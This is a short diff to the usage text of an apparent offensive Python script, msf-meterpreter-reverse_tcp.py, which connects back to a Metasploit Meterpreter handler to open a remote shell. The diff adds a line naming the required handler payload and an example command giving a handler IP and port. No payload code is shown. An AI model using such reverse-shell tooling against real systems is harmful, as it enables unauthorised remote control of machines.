@@ -11,9 +11,10 @@ import datetime
 i = datetime.datetime.today()
 
 instructions = 	"msf-meterpreter-reverse_tcp.py ( https://github.com/attackdebris/babel-sf )\n" +\
+		"[This script should be utilised with a python/meterpreter/reverse_tcp msf handler payload]\n" +\
 		"\nUsage:" +\
 		"\npython msf-meterpreter-reverse_tcp.py [remote handler IP] [port]" +\
-		"\ne.g. python msf-meterpreter-reverse_tcp.py 4444"
+		"\ne.g. python msf-meterpreter-reverse_tcp.py 192.168.0.1 4444"
 
 if len(sys.argv) <3:
 	print instructions
